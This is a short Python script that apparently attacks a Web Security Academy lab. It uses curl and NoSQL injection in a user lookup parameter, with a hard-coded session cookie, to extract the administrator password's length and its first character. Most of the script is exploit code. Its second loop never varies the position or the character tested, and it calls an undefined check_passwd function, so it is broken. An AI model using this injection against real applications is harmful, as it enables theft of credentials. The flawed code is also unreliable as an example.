import subprocess

for i in range(30):

    result = subprocess.check_output(f"curl \"https://0a29004103d5c93c81b761b500610098.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password.length=='{i}\" -b \"session=gGfRWGzVNbFPkaRpdmbdDb6mU7GE1vyy\"",
                                         shell=True, stderr=subprocess.DEVNULL).decode()
    resfind = result.find("Could not find user")
    if resfind == -1:
        pass_len=i


print(pass_len)
for i in range(pass_len):
    try:
        result = subprocess.check_output(f"curl \"https://0a29004103d5c93c81b761b500610098.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password%5b0%5d+%3d%3d+'e\" -b \"session=gGfRWGzVNbFPkaRpdmbdDb6mU7GE1vyy\"",
                                         shell=True, stderr=subprocess.DEVNULL).decode()
    except:
        result = ""

    print(result)

check_passwd("a")
